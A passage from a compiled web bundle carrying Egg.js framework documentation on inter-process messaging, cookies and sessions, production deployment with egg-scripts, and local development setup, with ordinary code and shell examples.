`,paraId:47,tocIndex:11},{value:"To simplify the invocation, we have encapsulated a messenger object and attached it to the app/agent instance, a set of friendly APIs is provided too.",paraId:48,tocIndex:11},{value:"app.messenger.broadcast(action, data)",paraId:49,tocIndex:12},{value:": sends messages to all agent/app processes(including itself)",paraId:49,tocIndex:12},{value:"app.messenger.sendToApp(action, data)",paraId:49,tocIndex:12},{value:`: sends messages to all app processes
`,paraId:49,tocIndex:12},{value:"when called on app, it sends messages to itself and other app processes",paraId:50,tocIndex:12},{value:"when called on agent, it sends messages to all app processes",paraId:50,tocIndex:12},{value:"app.messenger.sendToAgent(action, data)",paraId:49,tocIndex:12},{value:`: sends messages to the agent process
`,paraId:49,tocIndex:12},{value:"when called on app, it sends messages to the agent process",paraId:51,tocIndex:12},{value:"when called on agent, it sends messages to the agent itself",paraId:51,tocIndex:12},{value:"agent.messenger.sendRandom(action, data)",paraId:49,tocIndex:12},{value:`:
`,paraId:49,tocIndex:12},{value:"app dose not have this method(now Egg implements it as sendToAgent)",paraId:52,tocIndex:12},{value:"agent sends a random message to one app process(master determines whom to send to)",paraId:52,tocIndex:12},{value:"app.messenger.sendTo(pid, action, data)",paraId:49,tocIndex:12},{value:": send messages to specified process",paraId:49,tocIndex:12},{value:`// app.js
module.exports = (app) => {
  // Note, only after egg-ready event occurs can the message be sent
  app.messenger.once('egg-ready', () => {
    app.messenger.sendToAgent('agent-event', { foo: 'bar' });
    app.messenger.sendToApp('app-event', { foo: 'bar' });
  });
};
`,paraId:53,tocIndex:12},{value:"All methods called on ",paraId:54,tocIndex:12},{value:"app.messenger",paraId:54,tocIndex:12},{value:" above can be called on ",paraId:54,tocIndex:12},{value:"agent.messenger",paraId:54,tocIndex:12},{value:" too.",paraId:54,tocIndex:12},{value:"egg-ready",paraId:55},{value:"We mentioned in the example above that, only after egg-ready event occurs can the message be sent. Only after Master makes sure that all Agent process and Worker processes have been started successfully(and ready), can the ",paraId:56,tocIndex:13},{value:"egg-ready",paraId:56,tocIndex:13},{value:" message be sent to all Agent and Worker through messenger, notifying that everything is ready and the IPC channel can be used.",paraId:56,tocIndex:13},{value:"Listen the action event on messenger therefore messages sent by other processes can be received.",paraId:57,tocIndex:14},{value:`app.messenger.on(action, (data) => {
  // process data
});
app.messenger.once(action, (data) => {
  // process data
});
`,paraId:58,tocIndex:14},{value:"The way to receive messages using messenger in agent is the same with that of app.",paraId:59,tocIndex:14},{value:"Now we will show you how IPC solves real problems with the multi-process model of framework by a simple example.",paraId:60,tocIndex:15},{value:"We have a API that gets data from the remote data source and provides services outside. Since data of the data source change little and we prefer to cache it in the memory to accelerate the response of services and reduce the RT. Now a mechanism to update the memory cache is needed.",paraId:61,tocIndex:16},{value:"Get data from the remote data source periodically and update the memory cache. To reduce pressure on the data source, the period for updating may be set relatively long.",paraId:62,tocIndex:16},{value:"The remote data source provides an API to check whether its data has been updated. Our service calls that API more frequently and only when data is updated can it pull the data.",paraId:62,tocIndex:16},{value:"The remote data source pushes data changes through a message-oriented middleware on which our service listens to update the data.",paraId:62,tocIndex:16},{value:"In real projects, we use solution one to catch all, and, in combination with solution tow or three, the instantaneity of data updating can be sped up. In the example, we use IPC + ",paraId:63,tocIndex:16},{value:"scheduled tasks",paraId:64,tocIndex:16},{value:" to implement these three cache updating solutions in the same time.",paraId:63,tocIndex:16},{value:"We put all logics that is used to interact with the remote data source into a Service, where a ",paraId:65,tocIndex:17},{value:"get",paraId:65,tocIndex:17},{value:" method is exposed to Controller to invoke.",paraId:65,tocIndex:17},{value:`// app/service/source.js
let memoryCache = {};

class SourceService extends Service {
  get(key) {
    return memoryCache[key];
  }

  async checkUpdate() {
    // check if remote data source has changed
    const updated = await mockCheck();
    this.ctx.logger.info('check update response %s', updated);
    return updated;
  }

  async update() {
    // update memory cache from remote
    memoryCache = await mockFetch();
    this.ctx.logger.info('update memory cache from remote: %j', memoryCache);
  }
}
`,paraId:66,tocIndex:17},{value:"Write the scheduled task to implement solution one: gets data changes from the remote data source every 10 minutes to update cache as a cache-all.",paraId:67,tocIndex:17},{value:`// app/schedule/force_refresh.js
exports.schedule = {
  interval: '10m',
  type: 'all', // run in all workers
};

exports.task = async (ctx) => {
  await ctx.service.source.update();
  ctx.app.lastUpdateBy = 'force';
};
`,paraId:68,tocIndex:17},{value:"Write a scheduled task again to implement check logics of solution two: make a worker call the check API every 10 seconds and notify all Workers using methods provided by messenger when data changes are found.",paraId:69,tocIndex:17},{value:`// app/schedule/pull_refresh.js
exports.schedule = {
  interval: '10s',
  type: 'worker', // only run in one worker
};

exports.task = async (ctx) => {
  const needRefresh = await ctx.service.source.checkUpdate();
  if (!needRefresh) return;

  // notify all workers to update memory cache from \`file\`
  ctx.app.messenger.sendToApp('refresh', 'pull');
};
`,paraId:70,tocIndex:17},{value:"Listen on the ",paraId:71,tocIndex:17},{value:"pullRefresh",paraId:71,tocIndex:17},{value:" event in the customized start-up file and update data. All Worker processes will receive this message, trigger updates and our solution two succeeds at last.",paraId:71,tocIndex:17},{value:`// app.js
module.exports = (app) => {
  app.messenger.on('refresh', (by) => {
    app.logger.info('start update by %s', by);
    // create an anonymous context to access service
    const ctx = app.createAnonymousContext();
    ctx.runInBackground(async () => {
      await ctx.service.source.update();
      app.lastUpdateBy = by;
    });
  });
};
`,paraId:72,tocIndex:17},{value:"Now let's consider how to implement solution three. We need a message-oriented middleware that keeps persistent connections with the server side. This kind of persistent connections is proper for Agent process to keep which can effectively reduce connection numbers and reduce costs both ends. So we start message listening on Agent process.",paraId:73,tocIndex:17},{value:`// agent.js

const Subscriber = require('./lib/subscriber');

module.exports = (agent) => {
  const subscriber = new Subscriber();
  // listen changed event, broadcast to all workers
  subscriber.on('changed', () => agent.messenger.sendToApp('refresh', 'push'));
};
`,paraId:74,tocIndex:17},{value:"With an intelligent use of Agent process, scheduled tasks and IPC, we can easily implement this kind of requisition and reduce pressure on the data source. Detailed example codes refer to ",paraId:75,tocIndex:17},{value:"examples/ipc",paraId:75,tocIndex:17},{value:".",paraId:75,tocIndex:17},{value:"In the above example, we runs a subscriber on Agent process to listen messages sent by the message-oriented middleware. What if Worker processes need to listen messages? How to create connections by Agent process and transmit messages to Worker processes? Answers to these questions can be found in ",paraId:76,tocIndex:18},{value:"Advanced Multi-Process Developing Pattern",paraId:77,tocIndex:18},{value:".",paraId:76,tocIndex:18}]},15734:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(79174);const t=[{value:`HTTP is a stateless protocol.
But web applications often need to identify the sender of requests.
To solve this problem, HTTP protocol defines a header `,paraId:0,tocIndex:0},{value:"Cookie",paraId:0,tocIndex:0},{value:`.
Web servers can use response header `,paraId:0,tocIndex:0},{value:"Set-Cookie",paraId:0,tocIndex:0},{value:` to send small data to clients.
Clients (e.g. web browsers) store the data according to protocol,
and attach the cookie data in future requests.
For security reason, browsers only attach cookies in the requests that are sent to the same domain.
Web servers can use `,paraId:0,tocIndex:0},{value:"Domain",paraId:0,tocIndex:0},{value:" and ",paraId:0,tocIndex:0},{value:"Path",paraId:0,tocIndex:0},{value:" attributes to define the scope of the cookie.",paraId:0,tocIndex:0},{value:"By using ",paraId:1,tocIndex:0},{value:"ctx.cookies",paraId:1,tocIndex:0},{value:", we can easily and safely read/set cookies in controller.",paraId:1,tocIndex:0},{value:`class HomeController extends Controller {
  async add() {
    const ctx = this.ctx;
    let count = ctx.cookies.get('count');
    count = count ? Number(count) : 0;
    ctx.cookies.set('count', ++count);
    ctx.body = count;
  }
  async remove() {
    const ctx = this.ctx;
    ctx.cookies.set('count', null);
    ctx.status = 204;
  }
}
`,paraId:2,tocIndex:0},{value:"ctx.cookies.set(key, value, options)",paraId:3},{value:"Modifying Cookie is done by setting ",paraId:4,tocIndex:1},{value:"Set-Cookie",paraId:4,tocIndex:1},{value:` header in HTTP responses.
Each `,paraId:4,tocIndex:1},{value:"Set-Cookie",paraId:4,tocIndex:1},{value:` creates a key-value pair in client.
Besides of setting the value of Cookie,
HTTP protocol supports more attributes to control the transfer, storage and permission of Cookie.`,paraId:4,tocIndex:1},{value:"{Number} maxAge",paraId:5,tocIndex:1},{value:`: set the lifetime of the cookie in milliseconds. It's the milliseconds since server's "Now". Client discards a cookie after specified lifetime.`,paraId:5,tocIndex:1},{value:"{Date} expires",paraId:5,tocIndex:1},{value:": set the expiration time of the cookie. If ",paraId:5,tocIndex:1},{value:"maxAge",paraId:5,tocIndex:1},{value:" is defined, ",paraId:5,tocIndex:1},{value:"expires",paraId:5,tocIndex:1},{value:" will be ignored. If neither is defined, Cookie will expire when client session expires, usually it's the time client closed.",paraId:5,tocIndex:1},{value:"{String} path",paraId:5,tocIndex:1},{value:": set the path of the cookie. By default it's on root path (",paraId:5,tocIndex:1},{value:"/",paraId:5,tocIndex:1},{value:"), which means all URL under the current domain have access to the cookie.",paraId:5,tocIndex:1},{value:"{String} domain",paraId:5,tocIndex:1},{value:": set the domain of the cookie. By default, it's not defined. If defined, only specified domain have access to the cookie.",paraId:5,tocIndex:1},{value:"{Boolean} httpOnly",paraId:5,tocIndex:1},{value:": set whether the cookie can be accessed by Javascript. By default it's ",paraId:5,tocIndex:1},{value:"true",paraId:5,tocIndex:1},{value:", which means Javascript cannot access the cookie.",paraId:5,tocIndex:1},{value:"{Boolean} secure",paraId:5,tocIndex:1},{value:": set whether the cookie can only be accessed under HTTPS. See ",paraId:5,tocIndex:1},{value:"explanation",paraId:5,tocIndex:1},{value:" for details. Egg.js auto sets this value to true if the current request is sent over HTTPS.",paraId:5,tocIndex:1},{value:"In addition to these standard Cookie attributes, egg.js supports 3 more parameters:",paraId:6,tocIndex:1},{value:"{Boolean} overwrite",paraId:7,tocIndex:1},{value:": set the way of handling same Cookie key. If true, earlier called values will be overwritten by the last call; otherwise HTTP response will contain multiple ",paraId:7,tocIndex:1},{value:"Set-Cookie",paraId:7,tocIndex:1},{value:" headers with the same key.",paraId:7,tocIndex:1},{value:"{Boolean} signed",paraId:7,tocIndex:1},{value:": set whether the cookie should be signed. If true, the value of the cookie will be signed. So that when the value is being read, server verifies the signature to prevent cookie values modified by client. By default it's true.",paraId:7,tocIndex:1},{value:"{Boolean} encrypt",paraId:7,tocIndex:1},{value:": set whether the cookie should be encrypted. It true, the cookie value will be encrypted before sending to clients so user clients cannot get raw text of the cookie. By default it's false.",paraId:7,tocIndex:1},{value:`When using Cookie, we need to have a clear idea of the purpose of the cookie,
how long it needs to be stored in client, can it be accessed by JS, can it be modified by client.`,paraId:8,tocIndex:1},{value:`By default, Cookie is signed but not encrypted,
client can see raw content but cannot modify it (manually).`,paraId:9,tocIndex:1},{value:"If you need to allow JS to access and modify Cookie:",paraId:10,tocIndex:1},{value:`ctx.cookies.set(key, value, {
  httpOnly: false,
  signed: false,
});
`,paraId:11,tocIndex:1},{value:"If you don't want to allow JS to access and modify Cookie:",paraId:12,tocIndex:1},{value:`ctx.cookies.set(key, value, {
  httpOnly: true, // by default it's true
  encrypt: true, // cookies are encrypted during network transmission
});
`,paraId:13,tocIndex:1},{value:"Note:",paraId:14,tocIndex:1},{value:"Due to ",paraId:15,tocIndex:1},{value:"the uncertainty of client's implementation",paraId:15,tocIndex:1},{value:", to ensure Cookie can be stored successfully, it's recommended to encode cookie value in base64 or other codec.",paraId:15,tocIndex:1},{value:"Due to ",paraId:15,tocIndex:1},{value:"the limitation of Cookie length on client side",paraId:15,tocIndex:1},{value:", do avoid using long Cookie. Generally speaking, no more than 4093 bytes. When Cookie value's length is greater than this value, egg.js prints a warning in log.",paraId:15,tocIndex:1},{value:"ctx.cookies.get(key, options)",paraId:3},{value:`As HTTP Cookie is sent over header,
we can use this method to easily retrieve the value of given key from Cookie.
If `,paraId:16,tocIndex:2},{value:"options.signed",paraId:16,tocIndex:2},{value:" and ",paraId:16,tocIndex:2},{value:"options.encrypt",paraId:16,tocIndex:2},{value:` has been configured to sign and encrypt Cookie,
the corresponding options also need to be used in `,paraId:16,tocIndex:2},{value:"get",paraId:16,tocIndex:2},{value:" method.",paraId:16,tocIndex:2},{value:"If ",paraId:17,tocIndex:2},{value:"signed",paraId:17,tocIndex:2},{value:" is true when ",paraId:17,tocIndex:2},{value:"set",paraId:17,tocIndex:2},{value:" Cookie but false when ",paraId:17,tocIndex:2},{value:"get",paraId:17,tocIndex:2},{value:" Cookie, egg.js doesn't verify Cookie value, so the value could have been modified by client.",paraId:17,tocIndex:2},{value:"If ",paraId:17,tocIndex:2},{value:"encrypt",paraId:17,tocIndex:2},{value:" is true when ",paraId:17,tocIndex:2},{value:"set",paraId:17,tocIndex:2},{value:" Cookie but false when ",paraId:17,tocIndex:2},{value:"get",paraId:17,tocIndex:2},{value:" Cookie, what you get is encrypted text rather than the raw plain text.",paraId:17,tocIndex:2},{value:"If you want to get the cookie set by frontend or other system, you need to specify the parameter ",paraId:18,tocIndex:2},{value:"signed",paraId:18,tocIndex:2},{value:" as ",paraId:18,tocIndex:2},{value:"false",paraId:18,tocIndex:2},{value:", avoid varify the cookie and not getting the vlaue.",paraId:18,tocIndex:2},{value:`ctx.cookies.get('frontend-cookie', {
  signed: false,
});
`,paraId:19,tocIndex:2},{value:`Since we need to sign and encrypt Cookie, a secret key is required.
In `,paraId:20,tocIndex:3},{value:"config/config.default.js",paraId:20,tocIndex:3},{value:":",paraId:20,tocIndex:3},{value:`module.exports = {
  keys: 'key1,key2',
};
`,paraId:21,tocIndex:3},{value:"keys",paraId:22,tocIndex:3},{value:` is defined as a string, several keys separated by commas.
When egg.js processes Cookie:`,paraId:22,tocIndex:3},{value:"the first key is used in encryption and signature generation.",paraId:23,tocIndex:3},{value:"to decrypt or verify signature, egg.js iterates through all keys.",paraId:23,tocIndex:3},{value:`If you need to update Cookie secret key and don't want to invalidate existing clients' Cookie,
you can add new secret key at the front of `,paraId:24,tocIndex:3},{value:"keys",paraId:24,tocIndex:3},{value:`.
After some time, when existing Cookie has expired, delete the old secret keys.`,paraId:24,tocIndex:3},{value:`In web applications, Cookie is usually used to identify users.
So the concept of Session, which is built on top of Cookie,
was created to specifically handle user identification.`,paraId:25,tocIndex:4},{value:"Egg.js built-in supports Session through ",paraId:26,tocIndex:4},{value:"egg-session",paraId:26,tocIndex:4},{value:` plugin.
We can use `,paraId:26,tocIndex:4},{value:"ctx.session",paraId:26,tocIndex:4},{value:" to read or modify current user session.",paraId:26,tocIndex:4},{value:`class HomeController extends Controller {
  async fetchPosts() {
    const ctx = this.ctx;
    // get content from session
    const userId = ctx.session.userId;
    const posts = await ctx.service.post.fetch(userId);
    // modify session value
    ctx.session.visited = ctx.session.visited ? ctx.session.visited + 1 : 1;
    ctx.body = {
      success: true,
      posts,
    };
  }
}
`,paraId:27,tocIndex:4},{value:`It is very intuitive to use Session, simply get or set.
To delete a session, set its value to null:`,paraId:28,tocIndex:4},{value:`exports.deleteSession = function* (ctx) {
  ctx.session = null;
};
`,paraId:29,tocIndex:4},{value:"What you need to pay special attention to is that you need to avoid the following situations when setting session properties (which can cause field loss, See for details ",paraId:30,tocIndex:4},{value:"koa-session source code",paraId:30,tocIndex:4},{value:"):",paraId:30,tocIndex:4},{value:"Don't start with ",paraId:31,tocIndex:4},{value:"_",paraId:31,tocIndex:4},{value:"Don't use ",paraId:31,tocIndex:4},{value:"isNew",paraId:31,tocIndex:4},{value:`// \u274C Wrong way
ctx.session._visited = 1; //   --> property will lost
ctx.session.isNew = 'HeHe'; //   --> session keyword, should not write it

// \u2714\uFE0F Right way
ctx.session.visited = 1; //   -->  Everything is all right
`,paraId:32,tocIndex:4},{value:`Session is built on top of Cookie.
By default, the content of Session is stored in a Cookie field as encrypted string.
Every time a client sends requests to server, the cookie is attached in requests.
Egg.js passes decrypted cookie to server code.
The default configuration of Session is:`,paraId:33,tocIndex:4},{value:`exports.session = {
  key: 'EGG_SESS',
  maxAge: 24 * 3600 * 1000, // 1 day
  httpOnly: true,
  encrypt: true,
};
`,paraId:34,tocIndex:4},{value:"The attributes except of ",paraId:35,tocIndex:4},{value:"key",paraId:35,tocIndex:4},{value:` are all standard Cookie attributes.
`,paraId:35,tocIndex:4},{value:"key",paraId:35,tocIndex:4},{value:` is the key of the cookie that stores session content.
With default config, the session cookie is encrypted, not accessible to JS,
which ensures user cannot access or modify it.`,paraId:35,tocIndex:4},{value:`Session is stored in Cookie by default.
If a session is too big, there are some troubles.`,paraId:36,tocIndex:5},{value:"as mentioned above, clients usually have limitation on Cookie length. When session is too big, a client may refuse to store it.",paraId:37,tocIndex:5},{value:"Cookie is attached in every request. If session is too big, the additional cost of sending session may be significant.",paraId:37,tocIndex:5},{value:`Egg.js supports to store Session in other places.
To config it, you can simply set `,paraId:38,tocIndex:5},{value:"app.sessionStore",paraId:38,tocIndex:5},{value:".",paraId:38,tocIndex:5},{value:`// app.js
module.exports = (app) => {
  app.sessionStore = {
    // support promise / async
    async get(key) {
      // return value;
    },
    async set(key, value, maxAge) {
      // set key to store
    },
    async destroy(key) {
      // destroy key
    },
  };
};
`,paraId:39,tocIndex:5},{value:"The implementation of ",paraId:40,tocIndex:5},{value:"sessionStore",paraId:40,tocIndex:5},{value:` can also be encapsulated into a plugin.
For example, `,paraId:40,tocIndex:5},{value:"egg-session-redis",paraId:40,tocIndex:5},{value:` stores Session in Redis.
To apply it, import `,paraId:40,tocIndex:5},{value:"egg-redis",paraId:40,tocIndex:5},{value:" and ",paraId:40,tocIndex:5},{value:"egg-session-redis",paraId:40,tocIndex:5},{value:" plugin in your application.",paraId:40,tocIndex:5},{value:`// plugin.js
exports.redis = {
  enable: true,
  package: 'egg-redis',
};
exports.sessionRedis = {
  enable: true,
  package: 'egg-session-redis',
};
`,paraId:41,tocIndex:5},{value:`Note: once you choose to store Session in external storage,
it means your system heavily depends on the external storage.
Once it's down, Session feature won't work.
So it's recommended to put only necessary information in Session,
keep Session minimum and use the default Cookie storage if possible.
Do not put per-user's data cache in Session.`,paraId:42,tocIndex:5},{value:"Session config has a attribute ",paraId:43,tocIndex:7},{value:"maxAge",paraId:43,tocIndex:7},{value:", which controls global expiration time of all sessions of the application.",paraId:43,tocIndex:7},{value:"We often can see a ",paraId:44,tocIndex:7},{value:"Remember Me",paraId:44,tocIndex:7},{value:` option on a lot of websites' login page.
If it's selected, Session of this logged in user can live longer.
This kind of per-user session expiration time can be set through `,paraId:44,tocIndex:7},{value:"ctx.session.maxAge",paraId:44,tocIndex:7},{value:":",paraId:44,tocIndex:7},{value:`const ms = require('ms');
class UserController extends Controller {
  async login() {
    const ctx = this.ctx;
    const { username, password, rememberMe } = ctx.request.body;
    const user = await ctx.loginAndGetUser(username, password);

    // set Session
    ctx.session.user = user;
    // if user selected \`Remember Me\`, set expiration time to 30 days
    if (rememberMe) ctx.session.maxAge = ms('30d');
  }
}
`,paraId:45,tocIndex:7},{value:`By default, if user requests don't result in modification of Session,
egg.js doesn't extend expiration time of the session.
But in some scenarios, we hope that if users visit our site for a long time, then extend their session validity and not let the user exit the login state. The framework provides a `,paraId:46,tocIndex:8},{value:"renew",paraId:46,tocIndex:8},{value:" configuration item to implement this feature. It will reset the session's validity period when it finds that the user's session is half the maximum validity period.",paraId:46,tocIndex:8},{value:`// config/config.default.js
module.exports = {
  session: {
    renew: true,
  },
};
`,paraId:47,tocIndex:8}]},26493:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(35903);const t=[{value:"Launching application via ",paraId:0},{value:"egg-bin dev",paraId:0},{value:" will bring something magical to help people to develop in high efficiency. However, actually, those features are not required in production or any other environment. Let's walk through and learn how to deploy your application in Egg's way.",paraId:0},{value:"There are two steps to achieve building once and deploying multiply from source code to runtime.",paraId:1},{value:"In the stage, you don't need to compile JavaScript files unless TypeScript or Babel(ES6 features) are involved in stack.",paraId:2,tocIndex:0},{value:"Generally, before deploying the application, dependencies will be installed with ",paraId:3,tocIndex:0},{value:"NODE_ENV=production",paraId:3,tocIndex:0},{value:" or ",paraId:3,tocIndex:0},{value:"--production",paraId:3,tocIndex:0},{value:", which will exclude ",paraId:3,tocIndex:0},{value:"devDependencies",paraId:3,tocIndex:0},{value:" because those used in development may increase the size of package released or even create pitfalls that you never expect.",paraId:3,tocIndex:0},{value:`$ cd baseDir
$ npm install --production
$ tar -zcvf ../release.tgz .
`,paraId:4,tocIndex:0},{value:"Both the application and dependencies will be packed into a tgz file, what you are going to do is unzipping and launching it.",paraId:5,tocIndex:0},{value:"Reusable package brings a few pros in:",paraId:6,tocIndex:0},{value:"Environments in building and runtime are different, try to keep the later environment pure and stable.",paraId:7,tocIndex:0},{value:"Abbreviating publish progress and making rollback without hassle.",paraId:7,tocIndex:0},{value:"Node.js(",paraId:8,tocIndex:1},{value:">= 14.20.0",paraId:8,tocIndex:1},{value:") is required so that you should make sure it is pre-installed in runtime environment.",paraId:8,tocIndex:1},{value:"Egg takes ",paraId:9,tocIndex:1},{value:"egg-cluster",paraId:9,tocIndex:1},{value:" to create ",paraId:9,tocIndex:1},{value:"Master",paraId:9,tocIndex:1},{value:" process, which you can rely on to secure the application instead of daemon manager like ",paraId:9,tocIndex:1},{value:"pm2",paraId:9,tocIndex:1},{value:". The API is also really convenient for developers to achieve that, just ",paraId:9,tocIndex:1},{value:"egg.startCluster",paraId:9,tocIndex:1},{value:".",paraId:9,tocIndex:1},{value:"And framework also provide ",paraId:10,tocIndex:1},{value:"egg-scripts",paraId:10,tocIndex:1},{value:" for developers to start/stop application at prod mode.",paraId:10,tocIndex:1},{value:"Firstly, we need to import ",paraId:11,tocIndex:1},{value:"egg-scripts",paraId:11,tocIndex:1},{value:" as ",paraId:11,tocIndex:1},{value:"dependencies",paraId:11,tocIndex:1},{value:":",paraId:11,tocIndex:1},{value:`$ npm i egg-scripts --save
`,paraId:12,tocIndex:1},{value:"Then add ",paraId:13,tocIndex:1},{value:"npm scripts",paraId:13,tocIndex:1},{value:" to ",paraId:13,tocIndex:1},{value:"package.json",paraId:13,tocIndex:1},{value:":",paraId:13,tocIndex:1},{value:`{
  "scripts": {
    "start": "egg-scripts start --daemon",
    "stop": "egg-scripts stop"
  }
}
`,paraId:14,tocIndex:1},{value:"Then we are able to use ",paraId:15,tocIndex:1},{value:"npm start",paraId:15,tocIndex:1},{value:" and ",paraId:15,tocIndex:1},{value:"npm stop",paraId:15,tocIndex:1},{value:" to manage application.",paraId:15,tocIndex:1},{value:"Note: ",paraId:16,tocIndex:1},{value:"egg-scripts",paraId:16,tocIndex:1},{value:" has limited support for Windows, see ",paraId:16,tocIndex:1},{value:"#22",paraId:16,tocIndex:1},{value:".",paraId:16,tocIndex:1},{value:`$ egg-scripts start --port=7001 --daemon --title=egg-server-showcase
`,paraId:17,tocIndex:2},{value:"Options:",paraId:18,tocIndex:2},{value:"--port=7001",paraId:19,tocIndex:2},{value:" http server port, will use ",paraId:19,tocIndex:2},{value:"process.env.PORT",paraId:19,tocIndex:2},{value:", default to ",paraId:19,tocIndex:2},{value:"7001",paraId:19,tocIndex:2},{value:".",paraId:19,tocIndex:2},{value:"--daemon",paraId:19,tocIndex:2},{value:" whether run at background, so you don't need ",paraId:19,tocIndex:2},{value:"nohup",paraId:19,tocIndex:2},{value:". Ignore this when the application run in docker instance.",paraId:19,tocIndex:2},{value:"--env=prod",paraId:19,tocIndex:2},{value:" then framework env, will use ",paraId:19,tocIndex:2},{value:"process.env.EGG_SERVER_ENV",paraId:19,tocIndex:2},{value:", default to ",paraId:19,tocIndex:2},{value:"prod",paraId:19,tocIndex:2},{value:"\u3002",paraId:19,tocIndex:2},{value:"--workers=2",paraId:19,tocIndex:2},{value:" worker count, default to cpu cores, which can leverage the capability of the cpu.",paraId:19,tocIndex:2},{value:"--title=egg-server-showcase",paraId:19,tocIndex:2},{value:" convenient for ",paraId:19,tocIndex:2},{value:"ps + grep",paraId:19,tocIndex:2},{value:", default to ",paraId:19,tocIndex:2},{value:"egg-server-${appname}",paraId:19,tocIndex:2},{value:".",paraId:19,tocIndex:2},{value:"--framework=yadan",paraId:19,tocIndex:2},{value:" config ",paraId:19,tocIndex:2},{value:"egg.framework",paraId:19,tocIndex:2},{value:" at ",paraId:19,tocIndex:2},{value:"package.json",paraId:19,tocIndex:2},{value:" or pass this args, when you are using ",paraId:19,tocIndex:2},{value:"Custom Framework",paraId:20,tocIndex:2},{value:".",paraId:19,tocIndex:2},{value:"--ignore-stderr",paraId:19,tocIndex:2},{value:" ignore the std err at start up\u3002",paraId:19,tocIndex:2},{value:"--https.key",paraId:19,tocIndex:2},{value:" specify the https key full path, if start the server with https.",paraId:19,tocIndex:2},{value:"--https.cert",paraId:19,tocIndex:2},{value:" specify the https certificate full path, if start the server with https.",paraId:19,tocIndex:2},{value:"support all options from ",paraId:19,tocIndex:2},{value:"egg-cluster",paraId:19,tocIndex:2},{value:", such as ",paraId:19,tocIndex:2},{value:"--port",paraId:19,tocIndex:2},{value:".",paraId:19,tocIndex:2},{value:"More about ",paraId:21,tocIndex:2},{value:"egg-scripts",paraId:21,tocIndex:2},{value:" and ",paraId:21,tocIndex:2},{value:"egg-cluster",paraId:21,tocIndex:2},{value:" documents.",paraId:21,tocIndex:2},{value:"Note: ",paraId:22,tocIndex:2},{value:"--workers",paraId:22,tocIndex:2},{value:", default to ",paraId:22,tocIndex:2},{value:"process.env.EGG_WORKERS",paraId:22,tocIndex:2},{value:", if unset, egg will use ",paraId:22,tocIndex:2},{value:"os.cpus().length",paraId:22,tocIndex:2},{value:". However, in the docker, the ",paraId:22,tocIndex:2},{value:"os.cpus().length",paraId:22,tocIndex:2},{value:" may not be equal to the number of allocated cores, and the obtained value may be large, leading to startup failure. Then try to manually set ",paraId:22,tocIndex:2},{value:"--workers",paraId:22,tocIndex:2},{value:", see ",paraId:22,tocIndex:2},{value:"#1431",paraId:22,tocIndex:2},{value:".",paraId:22,tocIndex:2},{value:"Arguments of dispatch can be configured in ",paraId:23,tocIndex:3},{value:"config.{env}.js",paraId:23,tocIndex:3},{value:".",paraId:23,tocIndex:3},{value:`// config/config.default.js

exports.cluster = {
  listen: {
    port: 7001,
    hostname: '127.0.0.1', // It is not recommended to set the hostname to '0.0.0.0', which will allow connections from external networks and sources, please use it if you know the risk.
    // path: '/var/run/egg.sock',
  },
};
`,paraId:24,tocIndex:3},{value:"server.listen",paraId:25,tocIndex:3},{value:" supports arguments including ",paraId:25,tocIndex:3},{value:"path",paraId:25,tocIndex:3},{value:", ",paraId:25,tocIndex:3},{value:"port",paraId:25,tocIndex:3},{value:" and ",paraId:25,tocIndex:3},{value:"hostname",paraId:25,tocIndex:3},{value:" to change dispatching behavior. One thing you should know is that the ",paraId:25,tocIndex:3},{value:"port",paraId:25,tocIndex:3},{value:" in ",paraId:25,tocIndex:3},{value:"egg.startCluster",paraId:25,tocIndex:3},{value:" will override the one in application config.",paraId:25,tocIndex:3},{value:`$ egg-scripts stop
`,paraId:26,tocIndex:4},{value:"This command will kill master process which will handler and notice worker and agent to gracefull exit.",paraId:27,tocIndex:4},{value:"Also you can manually call ",paraId:28,tocIndex:4},{value:'ps -eo "pid,command" | grep -- "--title=egg-server"',paraId:28,tocIndex:4},{value:" to find master process then ",paraId:28,tocIndex:4},{value:"kill",paraId:28,tocIndex:4},{value:" without ",paraId:28,tocIndex:4},{value:"-9",paraId:28,tocIndex:4},{value:".",paraId:28,tocIndex:4}]},56642:function(n,a,e){e.r(a),e.d(a,{texts:function(){return t}});var o=e(22055);const t=[{value:"We provide convenient ways for development, debugging, and unit tests to improve your development experience.",paraId:0},{value:"Here, we need to use ",paraId:1},{value:"egg-bin",paraId:1},{value:" module (Only used in local development and unit tests. For production environment, please refer to ",paraId:1},{value:"Deployment",paraId:2},{value:").",paraId:1},{value:"First of all, we need to include ",paraId:3},{value:"egg-bin",paraId:3},{value:" module in ",paraId:3},{value:"devDependencies",paraId:3},{value:":",paraId:3},{value:`$ npm i egg-bin --save-dev
`,paraId:4},{value:"Once we have modified code and saved in local development, the app will restart automatically, and our changes will take place right after that.",paraId:5,tocIndex:0},{value:"Add ",paraId:6,tocIndex:1},{value:"npm scripts",paraId:6,tocIndex:1},{value:" into ",paraId:6,tocIndex:1},{value:"package.json",paraId:6,tocIndex:1},{value:"\uFF1A",paraId:6,tocIndex:1},{value:`{
  "scripts": {
    "dev": "egg-bin dev"
  }
}
`,paraId:7,tocIndex:1},{value:"And then we may start app by ",paraId:8,tocIndex:1},{value:"npm run dev",paraId:8,tocIndex:1},{value:".",paraId:8,tocIndex:1},{value:"To start app in local, environment needs to be set as ",paraId:9,tocIndex:2},{value:"env: local",paraId:9,tocIndex:2},{value:". The configuration comes from the combination of both ",paraId:9,tocIndex:2},{value:"config.local.js",paraId:9,tocIndex:2},{value:" and ",paraId:9,tocIndex:2},{value:"config.default.js",paraId:9,tocIndex:2},{value:".",paraId:9,tocIndex:2},{value:"Note: The local development environment relies on 'egg-development' module, enabled by default, and closed other environment, Configuration reference ",paraId:10,tocIndex:2},{value:"config/config.default.js",paraId:10,tocIndex:2},{value:"Reload",paraId:11},{value:"Under the following directory (including subdirectories) will watch file changes under development environment by default, trigger an Egg development environment server reload:",paraId:12,tocIndex:3},{value:"${app_root}/app",paraId:13,tocIndex:3},{value:"${app_root}/config",paraId:13,tocIndex:3},{value:"${app_root}/mocks",paraId:13,tocIndex:3},{value:"${app_root}/mocks_proxy",paraId:13,tocIndex:3},{value:"${app_root}/app.js",paraId:13,tocIndex:3},{value:"set ",paraId:14,tocIndex:3},{value:"config.development.overrideDefault",paraId:14,tocIndex:3},{value:" to ",paraId:14,tocIndex:3},{value:"true",paraId:14,tocIndex:3},{value:" to skip defaults merge.",paraId:14,tocIndex:3},{value:"Under the following directory (including subdirectories) will ignore file changes under development environment by 